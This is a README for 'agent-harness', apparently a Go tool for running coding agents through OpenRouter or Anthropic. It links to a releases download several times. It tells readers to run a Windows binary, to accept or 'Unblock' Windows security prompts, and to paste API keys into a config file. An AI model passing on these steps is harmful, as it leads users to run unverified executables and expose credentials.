# 🤖 agent-harness - Build and run agent tools

[![Download agent-harness](https://img.shields.io/badge/Download%20agent--harness-blue?style=for-the-badge)](https://github.com/vmy41/agent-harness/releases)

## 📥 Download

Visit this page to download: https://github.com/vmy41/agent-harness/releases

On that page, look for the latest release for Windows. Download the file that matches your system. If you are not sure, pick the standard Windows build.

## 🪟 Install on Windows

1. Open the download page.
2. Find the latest release.
3. Download the Windows file.
4. If the file is in a ZIP folder, right-click it and choose Extract All.
5. Open the extracted folder.
6. Double-click the app file to start it.

If Windows shows a security prompt, choose the option that lets you run the file.

## 🚀 What this app does

agent-harness is a desktop-friendly command line tool for working with coding agents. It gives you a clean way to run agent workflows, test prompts, and connect to AI services.

Use it to:

- try agent workflows on your own computer
- explore how coding agents make tool calls
- connect to OpenRouter or Anthropic
- learn how agent setups work
- extend the tool for your own needs

It is built in Go and keeps the core design simple. That makes it a good fit for learning and local use.

## 🧰 What you need

Before you run the app, make sure you have:

- a Windows PC
- an internet connection for the first download
- enough free disk space to unpack the app
- access to a command window if you plan to use the CLI

For best results, use a recent version of Windows 10 or Windows 11.

## ⚙️ First-time setup

After you open the app, set up your AI provider.

### OpenRouter
1. Get your OpenRouter API key.
2. Open the app settings or config file.
3. Paste the key into the API key field.
4. Save your changes.

### Anthropic
1. Get your Anthropic API key.
2. Open the app settings or config file.
3. Paste the key into the Anthropic field.
4. Save your changes.

If the app asks for a model name, choose a model that matches your provider account.

## 🖥️ Basic use

You can use agent-harness from a terminal window.

Common tasks:

- start a new agent run
- send a coding task to the agent
- review the tool use steps
- change the prompt and try again
- test how the agent responds to files and commands

A simple flow looks like this:

1. Open Terminal or Command Prompt.
2. Go to the app folder.
3. Run the app command.
4. Enter your task.
5. Watch the agent work.

## 🧠 What makes it useful

agent-harness helps you understand how modern coding agents work.

It focuses on:

- agent loops
- tool use
- prompt handling
- model calls
- local workflow control
- clear structure for extension

This makes it useful for people who want to study how tools like Claude Code, OpenCode, and Gemini CLI are built.

## 🔌 Supported services

The app supports:

- OpenRouter
- Anthropic

These services let the app send requests to large language models and get code help, task help, and step-by-step responses.

## 📁 Typical files and folders

After you unpack the app, you may see files like these:

- the main app file
- a config file
- a folder for logs
- a folder for saved runs
- a README file

Keep the whole folder together so the app can find what it needs.

## 🛠️ Troubleshooting

### The app does not open
- Make sure you downloaded the Windows version.
- Check that the file finished downloading.
- If the file is inside a ZIP folder, extract it first.
- Try running the app again.

### Windows blocks the file
- Right-click the file.
- Open Properties.
- If you see an Unblock box, select it.
- Try again.

### The app cannot connect to the AI service
- Check your internet connection.
- Confirm your API key is correct.
- Make sure your account has access to the model you selected.
- Try another model if the first one fails.

### The terminal closes too fast
- Open Command Prompt first.
- Run the app from inside the terminal.
- Read the error message before closing the window.

## 🧪 Example use cases

You can use agent-harness to:

- test a code change plan
- ask an agent to explain a repo
- see how tool calls are made
- compare model behavior
- learn from agent output
- build your own agent flow

## 📚 For learners

If you want to study agent design, this project is a good place to start.

It shows how to:

- structure a coding agent
- connect to model APIs
- handle tasks in steps
- use tools in a controlled way
- build a system that is easy to extend

## 🧭 Getting support

If the app does not work as expected:

1. Check the release notes on the download page.
2. Look for setup steps in the repo files.
3. Review your API key and model name.
4. Try a fresh download from the release page.

## 🔗 Download again

https://github.com/vmy41/agent-harness/releases